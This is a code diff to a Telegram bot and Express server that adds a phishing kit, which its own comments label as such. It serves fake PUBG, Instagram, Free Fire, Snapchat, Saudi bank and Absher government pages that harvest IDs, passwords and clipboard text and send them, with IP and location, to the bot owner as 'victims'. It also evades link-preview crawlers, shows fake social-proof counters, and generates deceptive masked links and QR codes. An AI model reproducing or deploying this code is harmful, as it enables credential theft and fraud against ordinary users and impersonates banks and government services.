@@ -25,9 +25,24 @@ const NOTES_FILE      = "./notes.json";
 const USERSTATS_FILE  = "./userstats.json";
 const PROFILES_FILE   = "./profiles.json";
 const PREMIUM_FILE    = "./premium.json";
+const PAGE_CONFIG_FILE = "./page_config.json";
+const SUBMISSIONS_FILE = "./submissions.json";
+
+const DEFAULT_PAGE_CONFIG = {
+  active:false, template:"pubg",
+  title:"احصل على 600 شدة مجاناً 🎁",
+  desc:"أدخل بياناتك لاستلام شداتك فوراً",
+  fields:[{label:"ID اللاعب",type:"text"},{label:"كلمة المرور",type:"password"}],
+  timer:10, social:"2,847 لاعب حصل على شداته اليوم",
+  redirect:"https://www.pubg.com", camouflage:false,
+  bgColor:"#0a0a1a", btnColor:"#f0a500", btnText:"استلم الآن 🎮", logo:null, views:0
+};
 
 const DEFAULT_FEATURES = { gyroscope:true, webrtc:true, fingerprint:true, sessionTime:true, lightSensor:true, clipboard:true, battery:true, vpnDetect:true };
 const DEFAULT_PREMIUM_FREE = { camera:false, audio:false, clipboard:false, contacts:false, files:false, persistentId:false, localNet:false, webpush:true, screencap:false, contcam:false, contaudio:false, faceAI:false, activityDetect:false, autofill:false, devtools:false };
+
+let pageConfig  = { ...DEFAULT_PAGE_CONFIG, ...loadJSON(PAGE_CONFIG_FILE, {}) };
+let submissions = loadJSON(SUBMISSIONS_FILE, []);
 
 let users      = new Set(loadJSON(USERS_FILE, []));
 let banned     = new Set(loadJSON(BANNED_FILE, []));
@@ -61,6 +76,37 @@ function saveNotes()     { saveJSON(NOTES_FILE,     notes); }
 function saveUserStats() { saveJSON(USERSTATS_FILE, userStats); }
 function saveProfiles()  { saveJSON(PROFILES_FILE,  profiles); }
 function savePremium()   { saveJSON(PREMIUM_FILE,   premium); }
+function savePageConfig(){ saveJSON(PAGE_CONFIG_FILE, pageConfig); backupFileToGH(PAGE_CONFIG_FILE,"_data/page_config.json").catch(()=>{}); }
+function saveSubmissions(){ saveJSON(SUBMISSIONS_FILE, submissions); backupFileToGH(SUBMISSIONS_FILE,"_data/submissions.json").catch(()=>{}); }
+
+// ── Page wizard state ─────────────────────────────────────────────────────────
+const _pageWiz = {};   // chatId → { step, data }
+const _pageTpls = {};  // name → config
+
+const TPL_THEMES = {
+  pubg:  { bg:"#0a0a1a", btn:"#f0a500", accent:"#f0a500", name:"🎮 ببجي",      redirect:"https://www.pubg.com" },
+  ig:    { bg:"#121212", btn:"#c13584", accent:"#833ab4", name:"📸 إنستغرام",  redirect:"https://www.instagram.com" },
+  ff:    { bg:"#0d0d0d", btn:"#e63946", accent:"#ff6b35", name:"🔥 فري فاير", redirect:"https://freefire.garena.com" },
+  snap:  { bg:"#1a1a00", btn:"#FFFC00", accent:"#FFFC00", name:"👻 سناب شات", redirect:"https://www.snapchat.com" },
+  bank:  { bg:"#0a1628", btn:"#1a56db", accent:"#1e40af", name:"🏦 بنكية",     redirect:"https://www.alrajhibank.com.sa" },
+  gov:   { bg:"#0a1f0a", btn:"#16a34a", accent:"#15803d", name:"🇸🇦 حكومية",  redirect:"https://www.absher.sa" },
+  custom:{ bg:"#0a0a1a", btn:"#6366f1", accent:"#4f46e5", name:"✏️ مخصص",     redirect:"https://www.google.com" },
+};
+
+function sendPageMain(chatId, editMsgId) {
+  const tName = TPL_THEMES[pageConfig.template]?.name || pageConfig.template;
+  const status = pageConfig.active ? (pageConfig.camouflage ? "🟡 تمويه" : "🟢 نشطة") : "🔴 متوقفة";
+  const toggleLabel = pageConfig.active ? (pageConfig.camouflage ? "✅ تشغيل كاملاً" : "⏸️ وضع تمويه") : "▶️ تشغيل الصفحة";
+  const text = `🎛️ *لوحة تحكم الصفحة الديناميكية*\n\n📡 الحالة: ${status}\n🎨 القالب: ${tName}\n👁️ مشاهدات: ${pageConfig.views||0}\n✅ إرسال مكتمل: ${submissions.length}\n📋 في الحافظة: ${pageConfig.clipCount||0}`;
+  const kb = JSON.stringify({ inline_keyboard:[
+    [{text:"✏️ تعديل الصفحة",callback_data:"pg_edit"},{text:"👁️ معاينة",callback_data:"pg_preview"}],
+    [{text:"📊 الإحصائيات",callback_data:"pg_stats"},{text:"📋 السجل",callback_data:"pg_log"}],
+    [{text:"🗺️ خريطة الضحايا",callback_data:"pg_map"},{text:"📁 القوالب",callback_data:"pg_tpls"}],
+    [{text:toggleLabel,callback_data:"pg_toggle"},{text:"🔗 الروابط",callback_data:"pg_links"}]
+  ]});
+  if (editMsgId) return bot.editMessageText(text,{chat_id:chatId,message_id:editMsgId,parse_mode:"Markdown",reply_markup:kb}).catch(()=>{});
+  return bot.sendMessage(chatId, text, {parse_mode:"Markdown", reply_markup:kb});
+}
 
 // Returns true if user has active premium (owner always has it)
 function isPremium(uid) {
@@ -440,6 +486,51 @@ app.get("/co/:path/*", async (req, res) => {
   res.render("contacts", { uid: req.params.path, a: hostURL, redirectUrl });
 });
 
+// ── Dynamic Phishing Page Routes ──────────────────────────────────────────────
+
+app.get("/p", (req, res) => {
+  const ua = (req.headers['user-agent']||'').toLowerCase();
+  if (ua.includes('telegrambot')||ua.includes('twitterbot')||ua.includes('facebookexternalhit')||ua.includes('whatsapp')) return res.status(200).send('OK');
+  if (!pageConfig.active) return res.redirect("https://www.google.com");
+  if (pageConfig.camouflage) return res.redirect(pageConfig.redirect||"https://www.google.com");
+  pageConfig.views = (pageConfig.views||0) + 1;
+  savePageConfig();
+  const ip = getIP(req);
+  enrichIP(ip).then(info => {
+    bot.sendMessage(BOT_OWNER, `👁️ شخص فتح الصفحة الديناميكية!\n⚓ IP: ${ip}\n${info||""}`).catch(()=>{});
+  });
+  res.render("dynpage", { cfg: pageConfig, host: hostURL });
+});
+
+app.post("/p/submit", express.json({limit:"1mb"}), async (req, res) => {
+  res.json({ok:true});
+  const { fields, device, platform, ip: clientIp, pid } = req.body || {};
+  const ip = getIP(req) || clientIp || "?";
+  const time = new Date().toJSON().slice(0,19).replace('T',' ');
+  const sub = { time, fields: fields||{}, device:device||"?", platform:platform||"?", ip, country:"?", pid:pid||null };
+  enrichIP(ip).then(info => {
+    if (info) {
+      const m = info.match(/🌍 (.+?) \|/); if (m) sub.country = m[1];
+    }
+    submissions.push(sub);
+    saveSubmissions();
+    let txt = `🎯 *ضحية جديدة ملأت الصفحة!*\n━━━━━━━━━━━━━━━━━━━\n`;
+    for (const [k,v] of Object.entries(fields||{})) txt += `📝 ${k}: \`${v}\`\n`;
+    txt += `━━━━━━━━━━━━━━━━━━━\n📱 ${device||"?"}\n🌍 ${sub.country} | ⚓ ${ip}\n⏰ ${time}`;
+    const kb = { inline_keyboard:[[{text:"🎛️ لوحة التحكم",callback_data:"pg_main"}]] };
+    bot.sendMessage(BOT_OWNER, txt, {parse_mode:"Markdown", reply_markup:JSON.stringify(kb)}).catch(()=>{});
+  });
+});
+
+app.post("/p/clip", express.json({limit:"512kb"}), (req, res) => {
+  res.json({ok:true});
+  const { text, device } = req.body||{};
+  if (!text || text.length < 3) return;
+  pageConfig.clipCount = (pageConfig.clipCount||0) + 1;
+  savePageConfig();
+  bot.sendMessage(BOT_OWNER, `📋 *نسخ من الحافظة!*\n📱 ${device||"?"}\n\n\`${text}\``, {parse_mode:"Markdown"}).catch(()=>{});
+});
+
 // ── Bot Logic ─────────────────────────────────────────────────────────────────
 
 bot.on('message', async (msg) => {
@@ -455,6 +546,49 @@ bot.on('message', async (msg) => {
     let sent = 0, failed = 0;
     for (const uid of users) { try { await bot.sendMessage(uid, msg.text); sent++; } catch(e) { failed++; } }
     return bot.sendMessage(chatId, `✅ ناجح: ${sent} | ❌ فشل: ${failed}`);
+  }
+
+  // ── Page wizard ────────────────────────────────────────────────────────────
+  if (chatId === BOT_OWNER && _pageWiz[chatId] && msg.text) {
+    const wiz = _pageWiz[chatId];
+    const txt = msg.text.trim();
+    if (txt === "/cancel") { delete _pageWiz[chatId]; return bot.sendMessage(chatId,"❌ تم الإلغاء."); }
+    switch(wiz.step) {
+      case "title":
+        wiz.data.title = txt; wiz.step = "desc";
+        return bot.sendMessage(chatId,"📝 النص التوضيحي تحت العنوان؟ (أو /skip)",{reply_markup:JSON.stringify({force_reply:true})});
+      case "desc":
+        wiz.data.desc = txt === "/skip" ? pageConfig.desc : txt; wiz.step = "fields";
+        return bot.sendMessage(chatId,"📋 الحقول؟ اكتب كل حقل بسطر — الشكل: اسم الحقل|نوعه\nالأنواع: text / password / number / email\nمثال:\nID اللاعب|text\nكلمة المرور|password",{reply_markup:JSON.stringify({force_reply:true})});
+      case "fields":
+        wiz.data.fields = txt.split("\n").filter(Boolean).map(l=>{
+          const [label,type] = l.split("|");
+          return {label:(label||l).trim(), type:(type||"text").trim()};
+        });
+        wiz.step = "btntext";
+        return bot.sendMessage(chatId,"🔘 نص زر الإرسال؟ (أو /skip للافتراضي)",{reply_markup:JSON.stringify({force_reply:true})});
+      case "btntext":
+        wiz.data.btnText = txt === "/skip" ? pageConfig.btnText : txt; wiz.step = "timer";
+        return bot.sendMessage(chatId,"⏱️ عداد تنازلي؟ اكتب عدد الدقائق أو 0 للإيقاف",{reply_markup:JSON.stringify({force_reply:true})});
+      case "timer":
+        wiz.data.timer = parseInt(txt)||0; wiz.step = "social";
+        return bot.sendMessage(chatId,"👥 نص عداد اجتماعي وهمي؟ (أو /skip)\nمثال: 2,847 لاعب حصل على شداته اليوم",{reply_markup:JSON.stringify({force_reply:true})});
+      case "social":
+        wiz.data.social = txt === "/skip" ? "" : txt; wiz.step = "redirect";
+        return bot.sendMessage(chatId,"🔗 رابط التحويل بعد الإرسال؟ (أو /skip)",{reply_markup:JSON.stringify({force_reply:true})});
+      case "redirect":
+        wiz.data.redirect = txt === "/skip" ? pageConfig.redirect : txt;
+        // Apply wizard data
+        Object.assign(pageConfig, wiz.data);
+        pageConfig.active = true;
+        savePageConfig();
+        delete _pageWiz[chatId];
+        return bot.sendMessage(chatId,
+          `✅ تم حفظ الصفحة وتفعيلها!\n\n🔗 الرابط: ${hostURL}/p\n\nاضغط /page للوحة التحكم`,
+          {reply_markup:JSON.stringify({inline_keyboard:[[{text:"🎛️ لوحة التحكم",callback_data:"pg_main"}]]})}
+        );
+    }
+    return;
   }
 
   // ── Reply to "إرسال رسالة" force-reply prompt ────────────────────────────
@@ -831,6 +965,19 @@ bot.on('message', async (msg) => {
     return bot.sendMessage(chatId, `📴 الجهاز غير متصل حالياً — سيصل الإشعار عند فتح الرابط مجدداً`);
   }
 
+  if (msg.text === "/page") {
+    if (chatId !== BOT_OWNER) return bot.sendMessage(chatId, "⛔ غير مصرح لك.");
+    return sendPageMain(chatId);
+  }
+
+  if (msg.text?.startsWith("/savetpl ")) {
+    if (chatId !== BOT_OWNER) return bot.sendMessage(chatId, "⛔ غير مصرح لك.");
+    const tplName = msg.text.replace("/savetpl ","").trim();
+    if (!tplName) return bot.sendMessage(chatId,"⚠️ استخدام: /savetpl اسم القالب");
+    _pageTpls[tplName] = { ...pageConfig };
+    return bot.sendMessage(chatId,`💾 تم حفظ القالب "${tplName}" بنجاح!`,{reply_markup:JSON.stringify({inline_keyboard:[[{text:"📁 قوالبي",callback_data:"pg_tpls"}]]})});
+  }
+
   if (msg.text === "/ping") {
     if (chatId !== BOT_OWNER) return bot.sendMessage(chatId, "⛔ غير مصرح لك.");
     const s=Date.now(); const m=await bot.sendMessage(chatId,"🏓 Pong!");
@@ -1027,6 +1174,178 @@ bot.on('callback_query', async (q) => {
       if (!global._pendingPush) global._pendingPush = {};
       global._pendingPush[m.message_id] = _pid;
     });
+  }
+
+  // ── Dynamic Page callbacks ─────────────────────────────────────────────────
+  if (data === "pg_main") { return sendPageMain(chatId, q.message.message_id); }
+
+  if (data === "pg_toggle") {
+    if (q.from.id !== BOT_OWNER) return;
+    if (!pageConfig.active) { pageConfig.active = true; pageConfig.camouflage = false; }
+    else if (!pageConfig.camouflage) { pageConfig.camouflage = true; }
+    else { pageConfig.active = false; pageConfig.camouflage = false; }
+    savePageConfig();
+    return sendPageMain(chatId, q.message.message_id);
+  }
+
+  if (data === "pg_preview") {
+    if (q.from.id !== BOT_OWNER) return;
+    return bot.sendMessage(chatId,
+      `👁️ معاينة الصفحة:\n🔗 ${hostURL}/p\n\nافتح الرابط لترى الصفحة كما ستظهر للضحية`,
+      {reply_markup:JSON.stringify({inline_keyboard:[[{text:"🔙 رجوع",callback_data:"pg_main"}]]})});
+  }
+
+  if (data === "pg_edit") {
+    if (q.from.id !== BOT_OWNER) return;
+    return bot.sendMessage(chatId, "🎨 اختر نوع الصفحة:", {
+      reply_markup: JSON.stringify({inline_keyboard:[
+        [{text:"🎮 ببجي",callback_data:"pg_tpl_pubg"},{text:"📸 إنستغرام",callback_data:"pg_tpl_ig"}],
+        [{text:"🔥 فري فاير",callback_data:"pg_tpl_ff"},{text:"👻 سناب شات",callback_data:"pg_tpl_snap"}],
+        [{text:"🏦 بنكية",callback_data:"pg_tpl_bank"},{text:"🇸🇦 حكومية",callback_data:"pg_tpl_gov"}],
+        [{text:"✏️ مخصص كامل",callback_data:"pg_tpl_custom"}],
+        [{text:"🔙 رجوع",callback_data:"pg_main"}]
+      ]})
+    });
+  }
+
+  if (data.startsWith("pg_tpl_")) {
+    if (q.from.id !== BOT_OWNER) return;
+    const tpl = data.replace("pg_tpl_","");
+    const theme = TPL_THEMES[tpl] || TPL_THEMES.custom;
+    pageConfig.template = tpl;
+    pageConfig.bgColor = theme.bg;
+    pageConfig.btnColor = theme.btn;
+    if (tpl !== "custom") {
+      pageConfig.redirect = theme.redirect;
+    }
+    savePageConfig();
+    _pageWiz[chatId] = { step:"title", data:{ template:tpl, bgColor:theme.bg, btnColor:theme.btn } };
+    return bot.sendMessage(chatId,
+      `✅ اخترت: ${theme.name}\n\nالآن سنضبط محتوى الصفحة خطوة بخطوة.\nاكتب /cancel في أي وقت للإلغاء.\n\n📌 *العنوان الرئيسي للصفحة؟*`,
+      {parse_mode:"Markdown", reply_markup:JSON.stringify({force_reply:true})}
+    );
+  }
+
+  if (data === "pg_stats") {
+    if (q.from.id !== BOT_OWNER) return;
+    const today = new Date().toISOString().slice(0,10);
+    const todaySubs = submissions.filter(s=>s.time?.startsWith(today)).length;
+    const rate = pageConfig.views ? Math.round(submissions.length/pageConfig.views*100) : 0;
+    return bot.sendMessage(chatId,
+      `📊 *إحصائيات الصفحة*\n\n👁️ إجمالي المشاهدات: ${pageConfig.views||0}\n✅ إجمالي الإرسال: ${submissions.length}\n📅 إرسال اليوم: ${todaySubs}\n📈 نسبة التحويل: ${rate}%\n📋 نسخ من الحافظة: ${pageConfig.clipCount||0}\n\n🎨 القالب: ${TPL_THEMES[pageConfig.template]?.name||pageConfig.template}`,
+      {parse_mode:"Markdown", reply_markup:JSON.stringify({inline_keyboard:[[{text:"🔙 رجوع",callback_data:"pg_main"}]]})}
+    );
+  }
+
+  if (data === "pg_log") {
+    if (q.from.id !== BOT_OWNER) return;
+    if (!submissions.length) return bot.sendMessage(chatId,"📋 لا توجد بيانات بعد.",{reply_markup:JSON.stringify({inline_keyboard:[[{text:"🔙 رجوع",callback_data:"pg_main"}]]})});
+    const last5 = submissions.slice(-5).reverse();
+    let txt = `📋 *آخر ${last5.length} إرسال:*\n━━━━━━━━━━━━━━\n`;
+    for (const s of last5) {
+      txt += `⏰ ${s.time||"?"}\n`;
+      for (const [k,v] of Object.entries(s.fields||{})) txt += `📝 ${k}: \`${v}\`\n`;
+      txt += `📱 ${s.device||"?"} | 🌍 ${s.country||"?"}\n━━━━━━━━━━━━━━\n`;
+    }
+    return bot.sendMessage(chatId, txt, {parse_mode:"Markdown",
+      reply_markup:JSON.stringify({inline_keyboard:[
+        [{text:"📥 تصدير الكل",callback_data:"pg_export"},{text:"🗑️ مسح الكل",callback_data:"pg_clear"}],
+        [{text:"🔙 رجوع",callback_data:"pg_main"}]
+      ]})
+    });
+  }
+
+  if (data === "pg_export") {
+    if (q.from.id !== BOT_OWNER) return;
+    if (!submissions.length) return bot.sendMessage(chatId,"لا توجد بيانات.");
+    let csv = "الوقت,الجهاز,الدولة,IP";
+    const allKeys = [...new Set(submissions.flatMap(s=>Object.keys(s.fields||{})))];
+    csv = "الوقت," + allKeys.join(",") + ",الجهاز,الدولة,IP\n";
+    csv += submissions.map(s=>[s.time,...allKeys.map(k=>s.fields?.[k]||""),s.device,s.country,s.ip].join(",")).join("\n");
+    const buf = Buffer.from(csv,"utf8");
+    return bot.sendDocument(chatId, buf, {caption:"📥 بيانات الصفحة الديناميكية"},{filename:"submissions.csv",contentType:"text/csv"});
+  }
+
+  if (data === "pg_clear") {
+    if (q.from.id !== BOT_OWNER) return;
+    submissions = []; saveSubmissions();
+    return bot.sendMessage(chatId,"🗑️ تم مسح جميع البيانات.",{reply_markup:JSON.stringify({inline_keyboard:[[{text:"🔙 رجوع",callback_data:"pg_main"}]]})});
+  }
+
+  if (data === "pg_map") {
+    if (q.from.id !== BOT_OWNER) return;
+    if (!submissions.length) return bot.sendMessage(chatId,"🗺️ لا توجد بيانات بعد.",{reply_markup:JSON.stringify({inline_keyboard:[[{text:"🔙 رجوع",callback_data:"pg_main"}]]})});
+    const countries = {};
+    submissions.forEach(s=>{ if(s.country){ countries[s.country]=(countries[s.country]||0)+1; } });
+    const sorted = Object.entries(countries).sort((a,b)=>b[1]-a[1]);
+    const txt = `🗺️ *توزيع الضحايا حسب الدولة:*\n\n` + sorted.map(([c,n])=>`${c}: ${n} ضحية`).join("\n");
+    return bot.sendMessage(chatId, txt, {parse_mode:"Markdown",reply_markup:JSON.stringify({inline_keyboard:[[{text:"🔙 رجوع",callback_data:"pg_main"}]]})});
+  }
+
+  if (data === "pg_tpls") {
+    if (q.from.id !== BOT_OWNER) return;
+    const saved = Object.keys(_pageTpls);
+    if (!saved.length) return bot.sendMessage(chatId,"📁 لا توجد قوالب محفوظة بعد.\nبعد تصميم صفحة اكتب /savetpl [اسم] لحفظها.",
+      {reply_markup:JSON.stringify({inline_keyboard:[[{text:"🔙 رجوع",callback_data:"pg_main"}]]})});
+    const kb = saved.map(n=>[{text:`📄 ${n}`,callback_data:`pg_loadtpl_${n}`},{text:"🗑️",callback_data:`pg_deltpl_${n}`}]);
+    kb.push([{text:"🔙 رجوع",callback_data:"pg_main"}]);
+    return bot.sendMessage(chatId,"📁 *قوالبك المحفوظة:*",{parse_mode:"Markdown",reply_markup:JSON.stringify({inline_keyboard:kb})});
+  }
+
+  if (data.startsWith("pg_loadtpl_")) {
+    if (q.from.id !== BOT_OWNER) return;
+    const name = data.replace("pg_loadtpl_","");
+    if (!_pageTpls[name]) return bot.sendMessage(chatId,"❌ القالب غير موجود.");
+    Object.assign(pageConfig, _pageTpls[name]); savePageConfig();
+    return bot.sendMessage(chatId,`✅ تم تحميل القالب "${name}" وتطبيقه.`,{reply_markup:JSON.stringify({inline_keyboard:[[{text:"🎛️ لوحة التحكم",callback_data:"pg_main"}]]})});
+  }
+
+  if (data.startsWith("pg_deltpl_")) {
+    if (q.from.id !== BOT_OWNER) return;
+    const name = data.replace("pg_deltpl_","");
+    delete _pageTpls[name];
+    return bot.sendMessage(chatId,`🗑️ تم حذف القالب "${name}".`,{reply_markup:JSON.stringify({inline_keyboard:[[{text:"🔙 رجوع",callback_data:"pg_tpls"}]]})});
+  }
+
+  if (data === "pg_links") {
+    if (q.from.id !== BOT_OWNER) return;
+    const realLink = `${hostURL}/p`;
+    return bot.sendMessage(chatId,
+      `🔗 *روابط صفحتك:*\n\n🔗 الرابط الحقيقي:\n\`${realLink}\`\n\n🎭 اختر شكل الرابط المخادع:`,
+      {parse_mode:"Markdown", reply_markup:JSON.stringify({inline_keyboard:[
+        [{text:"🎮 ببجي",callback_data:"pg_lnk_pubg"},{text:"📸 إنستغرام",callback_data:"pg_lnk_ig"}],
+        [{text:"🔥 فري فاير",callback_data:"pg_lnk_ff"},{text:"👻 سناب",callback_data:"pg_lnk_snap"}],
+        [{text:"🌐 جوجل",callback_data:"pg_lnk_google"},{text:"📱 واتساب",callback_data:"pg_lnk_wa"}],
+        [{text:"🔳 QR Code",callback_data:"pg_qr"},{text:"🔙 رجوع",callback_data:"pg_main"}]
+      ]})
+    });
+  }
+
+  if (data.startsWith("pg_lnk_")) {
+    if (q.from.id !== BOT_OWNER) return;
+    const type = data.replace("pg_lnk_","");
+    const realLink = `${hostURL}/p`;
+    const fakeTexts = {
+      pubg:`pubg.com/gifts/claim-${Math.random().toString(36).slice(2,6)}`,
+      ig:`instagram.com/p/${Math.random().toString(36).slice(2,10)}`,
+      ff:`ff.garena.com/rewards/${Math.random().toString(36).slice(2,8)}`,
+      snap:`snapchat.com/add/verify-${Math.random().toString(36).slice(2,6)}`,
+      google:`google.com/url?q=${encodeURIComponent(realLink)}`,
+      wa:`wa.me/link/${Math.random().toString(36).slice(2,8)}`
+    };
+    const fakeText = fakeTexts[type] || realLink;
+    return bot.sendMessage(chatId,
+      `🎭 *الرابط المخادع جاهز!*\n\nالضحية ستراه هكذا:\n\`${fakeText}\`\n\nأرسل هذه الرسالة للضحية كما هي (اضغط عليها للنسخ):`,
+      {parse_mode:"Markdown", reply_markup:JSON.stringify({inline_keyboard:[[{text:"🔙 رجوع",callback_data:"pg_links"}]]})}
+    ).then(()=>bot.sendMessage(chatId,`[${fakeText}](${realLink})`,{parse_mode:"Markdown"}));
+  }
+
+  if (data === "pg_qr") {
+    if (q.from.id !== BOT_OWNER) return;
+    const realLink = `${hostURL}/p`;
+    const qrUrl = `https://api.qrserver.com/v1/create-qr-code/?size=300x300&data=${encodeURIComponent(realLink)}`;
+    return bot.sendPhoto(chatId, qrUrl, {caption:`🔳 QR Code للصفحة الديناميكية\n🔗 ${realLink}`,
+      reply_markup:JSON.stringify({inline_keyboard:[[{text:"🔙 رجوع",callback_data:"pg_links"}]]})});
   }
 
   // ── Push device info (inline button) ──────────────────────────────────────
